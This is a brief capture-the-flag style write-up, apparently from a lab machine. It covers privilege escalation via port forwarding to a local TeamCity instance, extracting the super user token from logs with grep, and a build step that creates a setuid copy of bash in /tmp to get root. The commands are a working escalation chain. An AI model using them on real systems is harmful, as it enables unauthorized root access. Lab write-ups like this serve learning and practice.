netstat is not on the box, we enumerate by using `ss -tnol`

we find port the machine is listening locally on port`8111`

we decide to forward this port to port 8080 on our machine:

```
ssh -L 8080:127.0.0.1:8111 sys-internal@10.10.117.165 
```

---

going to `localhost:8080` brings us to a TeamCity login page. We don't have creds but we can login as super user using this method:

https://www.jetbrains.com/help/teamcity/super-user.html

after reading this, we grep for `super user authentication token` in the `/TeamCity/` directory

```
grep -R "Super user authentication token" 2>/dev/null
```

We find a token: `1332699655241810345`


---

After logging in, we build a new project.

There is a build step option to run command line. Because TeamCity runs as root, we can create a copy of `/bin/bash` in `/tmp`

```
cp /bin/bash /tmp/gimmeroot; chmod u+s /tmp/gimmeroot
```

run the build

cd to /tmp/
remember to use -p flag to retain permissions
```
./gimmeroot -p
```